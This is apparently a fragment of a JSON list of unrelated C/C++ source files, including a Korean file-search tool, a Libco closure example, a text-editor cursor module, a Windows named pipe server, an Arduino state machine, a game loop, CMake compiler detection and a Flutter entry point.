\uc2dd\ubcc4\n\n        if (check == 0 && fd.name[0] != '.')           //check == 0 \uacfc fd.name[0] !=(\uac19\uc9c0 \uc54a\ub2e4) '.'\uc774\uba74 1\ubc1c\uc0dd. \uc544\ub2c8\uba74 0\ubc1c\uc0dd.\n        {                                              //\ud3f4\ub354\uba74 FileExplorer \ub2e4\uc2dc \uc2e4\ud589.        \n            directorys[kk][k++] = file_pt;\n        }\n\n    }\n}\n\nvoid FileFinder(char address[])\n{\n\n    FileExplorer(address);              //\ud30c\uc77c \ud0d0\uc0c9\uae30\ub2a5, files[i]\uc5d0 \ud3f4\ub354 \ub0b4\ubd80\uc758 \ud30c\uc77c \uc774\ub984 \uc800\uc7a5.\n\n    cout << \" \ud0d0\uc0c9\ub41c \ud30c\uc77c \uc218 :\" << i << endl;\n\n    cout << \"\uac80\uc0c9\uc5b4\ub97c \uc785\ub825\ud558\uc138\uc694 : \";\n\n    cin.ignore();\n    cin.getline(search1, 100);\n\n\n    FileSearch(search1);                //\ud30c\uc77c \uc800\uc7a5 \ubc0f \uac80\uc0c9, \ucd9c\ub825 \uae30\ub2a5 :: files[i]\uc5d0\uc11c \ubb38\uc790\uc5f4 \ud0d0\uc0c9.\n    fileName();                 //05.14 \ucd94\uac00 \uc81c\ubaa9\uac80\uc0c9\n\n    i = 0;                      //5.01 \ucd94\uac00. \ud0d0\uc0c9 \ud6c4, \ud0d0\uc0c9\ub41c \ud30c\uc77c \ucd08\uae30\ud654\uc6a9. \uc774\uac70 \uc5c6\uc73c\uba74 \ud0d0\uc0c9\uacb0\uacfc \ub204\uc801\ub428.\n}\n\nvoid FileFinder()\n{\n\n    cout << \"\uc8fc\uc18c\ub97c \uc785\ub825\ud558\uc138\uc694 : \";\n\n    cin.ignore();               //cin.getline(address, 100); \ub450\ubc88 \uc785\ub825 \ubc1b\ub358 \uac83 cin.ignore()\ub85c \ud574\uacb0.\n    cin.getline(address, 100);\n\n    FileExplorer(address);\n\n    cout << \" \ud0d0\uc0c9\ub41c \ud30c\uc77c \uc218 :\" << i << endl;\n    cout << \"\uac80\uc0c9\uc5b4\ub97c \uc785\ub825\ud558\uc138\uc694 : \";\n\n    cin.getline(search1, 100);\n    FileSearch(search1);\n\n    i = 0;                      //5.01 \ucd94\uac00. \ud0d0\uc0c9 \ud6c4, \ud0d0\uc0c9\ub41c \ud30c\uc77c \ucd08\uae30\ud654\uc6a9. \uc774\uac70 \uc5c6\uc73c\uba74 \ud0d0\uc0c9\uacb0\uacfc \ub204\uc801\ub428.\n\n}\n\nint isFileOrDir()       //\ud558\uc704 \ub514\ub809\ud1a0\ub9ac\n{\n    if (fd.attrib & _A_SUBDIR)         //\uad6c\uc870\uccb4\uc5d0 \uc788\ub294 \uac78 \ube7c\uc640\uc11c\n        return 0;       // \ub514\ub809\ud1a0\ub9ac\uba74 0 \ubc18\ud658\n    else\n        return 1;       // \uadf8\ubc16\uc758 \uacbd\uc6b0\ub294 \"\uc874\uc7ac\ud558\ub294 \ud30c\uc77c\"\uc774\uae30\uc5d0 1 \ubc18\ud658\n}\n\nvoid FileExplorer(char file_path[])     //\ud30c\uc77c \ud0d0\uc0c9\uae30\ub2a5\n{\n    intptr_t handle;        //\ud3ec\uc778\ud130 \uad00\ub828 \ub370\uc774\ud130 \ud0c0\uc785 \uc800\uc7a5\uc6a9, \ud3ec\uc778\ud130\ub97c \uc815\uc218\ub85c \ud45c\ud604\ud560\ub54c \uc720\uc6a9\ud558\uac8c \uc0ac\uc6a9\ud560 \uc218 \uc788\ub2e4.\n    int check = 0;\n    char file_path2[_MAX_PATH];\n\n    strcat(file_path, \"\\\\\");\n    strcpy(file_path2, file_path);\n    strcat(file_path, \"*\");\n\n    if ((handle = _findfirst(file_path, &fd)) == -1)        //fd \uad6c\uc870\uccb4 \ucd08\uae30\ud654. //\ud30c\uc77c\uc744 \uad6c\ud604\ud55c\ub2e4.\n    {\n        printf(\"\ud30c\uc77c \ub610\ub294 \ud3f4\ub354\ub97c \ucc3e\uc744 \uc218 \uc5c6\uc2b5\ub2c8\ub2e4.\\n\");\n        return;\n    }\n\n    while (_findnext(handle, &fd) == 0)\n    {\n        char file_pt[_MAX_PATH];\n        strcpy(file_pt, file_path2);         //file_pt \uc5d0 file_path2(\uc6d0\ub798 \uc8fc\uc18c) \ubcf5\uc0ac\n        strcat(file_pt, fd.name);            //file_pt \ub4a4\uc5d0 fd.name(\ud30c\uc77c \uc81c\ubaa9?) \ubd99\uc5ec\ub77c\n\n        check = isFileOrDir();                         //\ud30c\uc77c\uc778\uc9c0 \ub514\ub809\ud1a0\ub9ac \uc778\uc9c0 \uc2dd\ubcc4\n\n        if (check == 0 && fd.name[0] != '.')           //check == 0 \uacfc fd.name[0] !=(\uac19\uc9c0 \uc54a\ub2e4) '.'\uc774\uba74 1\ubc1c\uc0dd. \uc544\ub2c8\uba74 0\ubc1c\uc0dd.\n        {\n            FileExplorer(file_pt);                     //\ud558\uc704 \ub514\ub809\ud1a0\ub9ac \uac80\uc0c9 \uc7ac\uadc0\ud568\uc218\n        }\n        else if (check == 1 && fd.size != 0 && fd.name[0] != '.')   //check == 1 \uacfc fd.name[] != '.'\uc774\uba74 1\ubc1c\uc0dd \uc544\ub2c8\uba74 0\ubc1c\uc0dd.\n        {\n            files[i] = file_pt; i++;\n        }\n    }\n}\n\nvoid FileSearch(char search1[])      //\ud30c\uc77c \ub0b4\uc6a9 \uc77d\uae30, \uc800\uc7a5, \n{\n    string s;\n    int cnt = 0;\n\n    cout << endl << \"\u25a0\u25a0\u25a0\u25a0\u25a0\u25a0\u25a0\u25a0\u25a0\u25a0\u25a0\u25a0\u25a0\u25a0\u25a0 \ud30c\uc77c \ub0b4\uc6a9 \uac80\uc0c9 \u25a0\u25a0\u25a0\u25a0\u25a0\u25a0\u25a0\u25a0\u25a0\u25a0\u25a0\u25a0\u25a0\u25a0\u25a0\" << endl << endl;\n\n    for (int j = 0; j < i; j++)\n    {\n        if (getFileExtension(files[j]))\n        {\n            ifstream in(files[j]);\n            if (in.is_open())\n            {\n                in.seekg(0, ios::end);      // \uc704\uce58 \uc9c0\uc815\uc790\ub97c \ud30c\uc77c \ub05d\uc73c\ub85c \uc62e\uae34\ub2e4.\n\n                int size = in.tellg();      // \uadf8\ub9ac\uace0 \uadf8 \uc704\uce58\ub97c \uc77d\ub294\ub2e4. (\ud30c\uc77c\uc758 \ud06c\uae30)\n\n                s.resize(size);             // \uadf8 \ud06c\uae30\uc758 \ubb38\uc790\uc5f4\uc744 \ud560\ub2f9\ud55c\ub2e4.\n\n                in.seekg(0, ios::beg);      // \uc704\uce58 \uc9c0\uc815\uc790\ub97c \ub2e4\uc2dc \ud30c\uc77c \ub9e8 \uc55e\uc73c\ub85c \uc62e\uae34\ub2e4.\n\n                in.read(&s[0], size);       // \ud30c\uc77c \uc804\uccb4 \ub0b4\uc6a9\uc744 \uc77d\uc5b4\uc11c \ubb38\uc790\uc5f4\uc5d0 \uc800\uc7a5\ud55c\ub2e4.\n            }\n\n            char* s1 = new char[s.length() + 1]; //\ub3d9\uc801 \ud560\ub2f9(\ubbf8\ub9ac \uba54\ubaa8\ub9ac \uc548\uc5d0 \uacf5\uac04\uc744 \ub9cc\ub4e4\uc5b4\ub454\ub2e4.). \ubb38\uc790 \ub9ce\uc740 \ud30c\uc77c\uc740 \uc624\ub958 \ub098\uc11c \uc218\uc815\ud568.\n            strcpy(s1, s.c_str());\n\n            if (strstr(s1, search1) != NULL)\n            {\n                cout << files[j] << \"\\n\" << \"\u2192 \ud574\ub2f9 \uc8fc\uc18c\uc5d0\ub294 \uac80\uc0c9\uc5b4 '\" << search1",
    "/*\n* Tencent is pleased to support the open source community by making Libco available.\n\n* Copyright (C) 2014 THL A29 Limited, a Tencent company. All rights reserved.\n*\n* Licensed under the Apache License, Version 2.0 (the \"License\"); \n* you may not use this file except in compliance with the License. \n* You may obtain a copy of the License at\n*\n*\thttp://www.apache.org/licenses/LICENSE-2.0\n*\n* Unless required by applicable law or agreed to in writing, \n* software distributed under the License is distributed on an \"AS IS\" BASIS, \n* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n* See the License for the specific language governing permissions and \n* limitations under the License.\n*/\n\n#include \"co_closure.h\"\n#include <stdio.h>\n#include <stdlib.h>\n#include <vector>\n#include <pthread.h>\n#include <unistd.h>\nusing namespace std;\n\nstatic void *thread_func( void * arg )\n{\n\tstCoClosure_t *p = (stCoClosure_t*) arg;\n\tp->exec();\n\treturn 0;\n}\nstatic void batch_exec( vector<stCoClosure_t*> &v )\n{\n\tvector<pthread_t> ths;\n\tfor( size_t i=0;i<v.size();i++ )\n\t{\n\t\tpthread_t tid;\n\t\tpthread_create( &tid,0,thread_func,v[i] );\n\t\tths.push_back( tid );\n\t}\n\tfor( size_t i=0;i<v.size();i++ )\n\t{\n\t\tpthread_join( ths[i],0 );\n\t}\n}\nint main( int argc,char *argv[] )\n{\n\tvector< stCoClosure_t* > v;\n\n\tpthread_mutex_t m = PTHREAD_MUTEX_INITIALIZER;\n\n\tint total = 100;\n\tvector<int> v2;\n\tco_ref( ref,total,v2,m);\n\tfor(int i=0;i<10;i++)\n\t{\n\t\tco_func( f,ref,i )\n\t\t{\n\t\t\tprintf(\"ref.total %d i %d\\n\",ref.total,i );\n\t\t\t//lock\n\t\t\tpthread_mutex_lock(&ref.m);\n\t\t\tref.v2.push_back( i );\n\t\t\tpthread_mutex_unlock(&ref.m);\n\t\t\t//unlock\n\t\t}\n\t\tco_func_end;\n\t\tv.push_back( new f( ref,i ) );\n\t}\n\tfor(int i=0;i<2;i++)\n\t{\n\t\tco_func( f2,i )\n\t\t{\n\t\t\tprintf(\"i: %d\\n\",i);\n\t\t\tfor(int j=0;j<2;j++)\n\t\t\t{\n\t\t\t\tusleep( 1000 );\n\t\t\t\tprintf(\"i %d j %d\\n\",i,j);\n\t\t\t}\n\t\t}\n\t\tco_func_end;\n\t\tv.push_back( new f2( i ) );\n\t}\n\n\tbatch_exec( v );\n\tprintf(\"done\\n\");\n\n\treturn 0;\n}\n\n\n",
    "#include \"main.h\"\r\n#include \"edit.h\"\r\n#include <stdio.h>\r\n\r\nvoid move_cursor(int pos,text& t){\r\n    unsigned int temp;\r\n    if(pos<0){\r\n        while(pos&&t.cursor_line){\r\n            t.cursor_line--;\r\n            t.Cursorline=t.Cursorline->prev;\r\n            pos++;\r\n        }\r\n    }\r\n    else{\r\n        if(pos+t.cursor_line>=t.line_count) return;\r\n        while(pos&&t.cursor_line<t.line_count){\r\n            t.cursor_line++;\r\n            t.Cursorline=t.Cursorline->next;\r\n            pos--;\r\n        }\r\n    }\r\n    temp=len(t.Cursorline);\r\n    \r\n    if(t.prev_cursor_col){\r\n        if(t.prev_cursor_col+1>temp){\r\n            t.cursor_col=temp-1;\r\n        }\r\n        else{\r\n            t.cursor_col=t.prev_cursor_col;\r\n        }\r\n    }\r\n    else{\r\n        t.prev_cursor_col=t.cursor_col;\r\n        if(t.cursor_col+1>temp){\r\n            t.cursor_col=temp-1;\r\n        }\r\n    }\r\n}\r\n\r\nvoid move_cursor_side(int pos,text& t){\r\n    if(pos<0){\r\n        while(pos&&t.Cursor){\r\n            t.Cursor=t.Cursor->prev;\r\n            if(t.Cursor==NULL){\r\n                if(t.Cursorline->prev==NULL);\r\n                else{\r\n                    t.cursor_line--;\r\n                    t.Cursor=t.Cursorline->prev->tail;\r\n                    t.cursor_col=len(t.Cursorline->prev)-1;\r\n                    t.Cursorline=t.Cursorline->prev;\r\n                }\r\n            }\r\n            else{\r\n                t.cursor_col--;\r\n            }\r\n            pos++;\r\n        }\r\n    }\r\n    else{\r\n        while(pos&&t.Cursor){\r\n            t.Cursor=t.Cursor->next;\r\n            if(t.Cursor==NULL&&t.Cursorline->next==NULL) return;\r\n            if(t.Cursor==NULL){\r\n                t.cursor_line++;\r\n                t.Cursor=t.Cursorline->next->head;\r\n                t.Cursorline=t.Cursorline->next;\r\n                t.cursor_col=0;\r\n            }\r\n            else{\r\n                t.cursor_col++;\r\n            }\r\n            pos--;\r\n        }\r\n    }\r\n    t.prev_cursor_col=0;\r\n}\r\n\r\nunsigned int len(struct line * head){\r\n    unsigned int res=0;\r\n    struct charn *temp=head->head;\r\n    while(temp){\r\n        res++;\r\n        temp=temp->next;\r\n    }\r\n    return res;\r\n}",
    "#include \"NamedPipeServer.h\"\n\n\nNamedPipeServer::NamedPipeServer(SimpleFileLogger& rlogger) : m_logger(rlogger)\n{\n    m_callback = nullptr;\n    m_running = true;\n}\n\nvoid NamedPipeServer::SetCallback(NamedPipeServerCallback callback)\n{\n    m_callback = callback;\n}\n\nbool NamedPipeServer::CallCallback(const std::wstring& message) const\n{\n    if (m_callback != nullptr) {\n        return m_callback(message);\n    }\n    m_logger.Log(L\"No callback set!\", 1, true);\n    return false;\n}\n\nbool NamedPipeServer::CreateNamedPipeObject(HANDLE& hPipe) const\n{\n    // Create named pipe\n    hPipe = CreateNamedPipe(\n        PIPE_NAME,\n        PIPE_ACCESS_DUPLEX,\n        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,\n        1,\n        512,\n        512,\n        0,\n        NULL);\n\n    if (hPipe == INVALID_HANDLE_VALUE) {\n        DWORD dwError = GetLastError();\n        std::wstringstream wss;\n        wss << L\"Failed to create named pipe. Error code: \" << dwError;\n        m_logger.Log(wss.str().c_str(), 2, true);\n        return false;\n    }\n    return true;\n}\n\nstd::wstring NamedPipeServer::StringToWstring(const std::string& str)\n{\n    int bufferSize = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, nullptr, 0);\n    if (bufferSize == 0) {\n        return L\"\";\n    }\n    std::wstring result(bufferSize - 1, L'\\0');  // The -1 accounts for the null terminator\n    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &result[0], bufferSize);\n    return result;\n}\n\nbool NamedPipeServer::HandleClientRequest(HANDLE hPipe) const\n{\n    char buffer[512];\n    DWORD bytesRead;\n\n    BOOL success = ReadFile(hPipe, buffer, sizeof(buffer), &bytesRead, NULL);\n\n    if (!success || bytesRead == 0) {\n        DWORD dwError = GetLastError();\n        if (dwError == ERROR_BROKEN_PIPE) {\n            m_logger.Log(L\"Client disconnected.\", 2, true);\n            return false;\n        }\n        std::wstringstream wss;\n        wss << L\"Error reading from pipe. Error code: \" << dwError;\n        m_logger.Log(wss.str().c_str(), 2, true);\n        return false;\n    }\n\n    buffer[bytesRead] = L'\\0';  // Null-terminate the string\n    std::string byteMessage(buffer);\n    std::wstring request = StringToWstring(byteMessage);\n\n    return CallCallback(request);\n}\n\nvoid NamedPipeServer::Serve()\n{\n    m_logger.Log(L\"listen thread starts.\", 2, true);\n\n    HANDLE hPipe;\n    if (!CreateNamedPipeObject(hPipe))\n        return;\n\n    while (m_running)\n    {\n        m_logger.Log(L\"Server is waiting for client connection...\");\n\n        auto connected = ConnectNamedPipe(hPipe, NULL);\n        if (!connected) {\n            std::wstringstream wss;\n            DWORD dwError = GetLastError();\n            wss << L\"Failed to connect to client. Error code: \" << dwError << std::endl;\n            m_logger.Log(wss.str().c_str(), 2, true);\n            CloseHandle(hPipe);\n            return;\n        }\n\n        m_logger.Log(L\"Client connected.\", 1, true);\n\n        if (!HandleClientRequest(hPipe))\n        {\n            m_running = false;\n        }\n\n        DisconnectNamedPipe(hPipe);\n    }\n\n    CloseHandle(hPipe);\n    m_logger.Log(L\"listen thread starts.\", 2, true);\n}\n",
    "#include <framework/utility/RejectInfo.h>\n\nnamespace hyper::framework\n{\n    const char *to_chars(InteranlRejectCode code) noexcept\n    {\n        using enum InteranlRejectCode;\n        switch (code)\n        {\n        case SourceSession_Invalid_Original_Msg_ID:\n            return \"SourceSession_Invalid_Original_Msg_ID\";\n        case DestinationRouter_No_Destinations_Available:\n            return \"DestinationRouter_No_Destinations_Available\";\n        case DestinationRouter_Session_Not_Found_For_UID:\n            return \"DestinationRouter_Session_Not_Found_For_UID\";\n        case SourceRouter_Routing_Failed:\n            return \"SourceRouter_Routing_Failed\";\n        case DestinationSession_To_Destination_Encoding_Failed:\n            return \"DestinationSession_To_Destination_Encoding_Failed\";\n        case DestinationSession_From_Destination_Decoding_Failed:\n            return \"DestinationSession_From_Destination_Decoding_Failed\";\n        case Validatator_Validation_Failed:\n            return \"Validatator_Validation_Failed\";\n        case SourceSession_Transform_Failed:\n            return \"SourceSession_Transform_Failed\";\n        case SourceSession_Validation_Failed:\n            return \"SourceSession_Validation_Failed\";\n        case DestinationSession_Transform_Failed:\n            return \"DestinationSession_Transform_Failed\";\n        case DestinationSession_Validation_Failed:\n            return \"DestinationSession_Validation_Failed\";\n        default:\n            return \"Unknown_Reject_Code\";\n        }\n    }\n\n    std::string to_string(InteranlRejectCode code) noexcept\n    {\n        return to_chars(code);\n    }\n\n}",
    "#include <Arduino.h>\r\n#include <StateMachine.h>\r\n\r\n// Define 2 state classes, Ideally in a separate file\r\nclass IdleState : public State {\r\npublic:\r\n    void onEnter() override {\r\n        Serial.println(\"ENTER: IdleState\");\r\n    }\r\n    void onUpdate() override {\r\n        Serial.println(\"UPDATE: IdleState\");\r\n    }\r\n    void onExit() override {\r\n        Serial.println(\"EXIT: IdleState\");\r\n    }\r\n};\r\n\r\nclass ActiveState : public State {\r\npublic:\r\n    void onEnter() override {\r\n        Serial.println(\"ENTER: ActiveState\");\r\n    }\r\n    void onUpdate() override {\r\n        Serial.println(\"UPDATE: ActiveState\");\r\n    }\r\n    void onExit() override {\r\n        Serial.println(\"EXIT: ActiveState\");\r\n    }\r\n};\r\n\r\n// Instantiate state machine and states\r\n// The number <2> indicates the number of transitions, see below\r\nStateMachine<2> stateMachine;\r\nIdleState idleState;\r\nActiveState activeState;\r\n\r\n// Declare condition functions\r\nbool shouldActivate() {\r\n  return digitalRead(1, HIGH);\r\n}\r\n\r\nbool shouldIdle() {\r\n  return digitalRead(1, LOW);\r\n}\r\n\r\nvoid setup() {\r\n  Serial.begin(115200);\r\n\r\n  // Create transitions.\r\n  // Remember to increment the number of transitions, (e.g. StateMachine<3>) when you add more transitions\r\n  stateMachine.addTransition(&idleState, &activeState, &shouldActivate);\r\n  stateMachine.addTransition(&activeState, &idleState, &shouldIdle);\r\n\r\n  // Set initial state\r\n  stateMachine.setState(&idleState);\r\n}\r\n\r\nvoid loop() {\r\n  stateMachine.update();\r\n\r\n  // Add delay for this example only, to prevent too many serial messages\r\n  delay(1000);\r\n}\r\n",
    "#include <iostream>\n#include \"Engine.h\"\n#include <Windows.h>\n\nEngine::Engine()\n\t: quit(false)\n{\n}\n\nEngine::~Engine()\n{\n}\n\nvoid Engine::Run()\n{\n\t// \uc2dc\uac04 \ud0c0\uc784 \uc2a4\ud0ec\ud504 \uc800\uc7a5.\n\t//unsigned long currentTIme = timeGetTime();\n\t//unsigned long previousTIme = 0;\n\n\t// cpu \uc2dc\uacc4 \uc0ac\uc6a9.\n\tLARGE_INTEGER frequency;\n\tQueryPerformanceFrequency(&frequency);\n\n\t// \uc2dc\uc791 \uc2dc\uac04 \ubc0f \uc774\uc804 \uc2dc\uac04\uc744 \uc704\ud55c \ubcc0\uc218.\n\tLARGE_INTEGER time;\n\tQueryPerformanceCounter(&time);\n\n\tint64_t currentTIme = time.QuadPart;\n\tint64_t previousTime = 0;\n\n\t// \ud50c\ub808\uc784 \uc81c\ud55c.\n\tfloat targetFrameRate = 60.0f;\n\n\t// \ud55c \ud504\ub808\uc784 \uc2dc\uac04 \uacc4\uc0b0.\n\tfloat targetIneFrameTime = 1.0f / targetFrameRate;\n\n\t// Game-Loop.\n\twhile (true)\n\t{\n\t\t// \uc885\ub8cc \uc870\uac74.\n\t\tif (quit)\n\t\t{\n\t\t\tbreak ;\n\t\t}\n\n\t\t//currentTIme = timeGetTime();\n\n\t\t// \ud604\uc7ac \ud504\ub808\uc784 \uc2dc\uac04 \uc800\uc7a5.\n\t\tQueryPerformanceCounter(&time);\n\t\tcurrentTIme = time.QuadPart;\n\t\n\t\t// \ud504\ub808\uc784 \uc2dc\uac04 \uacc4\uc0b0.\n\t\tfloat deltaTIme = static_cast<float>(currentTIme - previousTime) /\tstatic_cast<float>(frequency.QuadPart);\n\n\t\t// \ud504\ub808\uc784 \ud655\uc778.\n\t\tif (deltaTIme >= targetIneFrameTime)\n\t\t{\n\t\t\t// \uc785\ub825 \ucc98\ub9ac(\ud604\uc7ac \ud0a4\uc758 \ub20c\ub9bc \uc0c1\ud0dc \ud655\uc778).\n\t\t\tProcessInput();\n\n\t\t\tUpadate(deltaTIme);\n\t\t\tDraw();\n\n\t\t\tSavePreviouseKeyStates();\n\n\t\t\t// \uc774\uc804 \ud504\ub808\uc784 \uc2dc\uac04 \uc800\uc7a5.\n\t\t\tpreviousTime = currentTIme;\n\t\t}\n\t}\n}\n\nbool Engine::GetKey(int key)\n{\n\treturn keyState[key].isKeyDown;\n}\n\nbool Engine::GetKeyDown(int key)\n{\n\treturn (keyState[key].isKeyDown && !keyState[key].wasKeyDown);\n}\n\nbool Engine::GetKeyUp(int key)\n{\n\treturn (!keyState[key].isKeyDown && keyState[key].wasKeyDown);\n}\n\nvoid Engine::QuitGame()\n{\n\tquit = true;\n}\n\nvoid Engine::ProcessInput()\n{\n\tfor (int ix = 0; ix < 255; ix++)\n\t{\n\t\tkeyState[ix].isKeyDown = (GetAsyncKeyState(ix) & 0x8000) ? true : false;\n\t}\n}\n\nvoid Engine::Upadate(float deltaTime)\n{\n\t// ESC\ud0a4\ub85c \uac8c\uc784 \uc885\ub8cc\n\tif (GetKeyDown(VK_ESCAPE))\n\t{\n\t\tQuitGame();\n\t}\n\n\tstd::cout << \"DeltaTime : \" << deltaTime << \", FPS : \" << (1.0f / deltaTime) << \"\\n\";\n}\n\nvoid Engine::Draw()\n{\n}\n\nvoid Engine::SavePreviouseKeyStates()\n{\n\tfor (int ix = 0; ix < 255; ix++)\n\t{\n\t\tkeyState[ix].wasKeyDown = keyState[ix].isKeyDown;\n\t}\n}\n",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ = VVRP + 1100 */\n# define COMPILER_VERSION_MAJOR DEC((__WATCOMC__ - 1100) / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"poject11\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
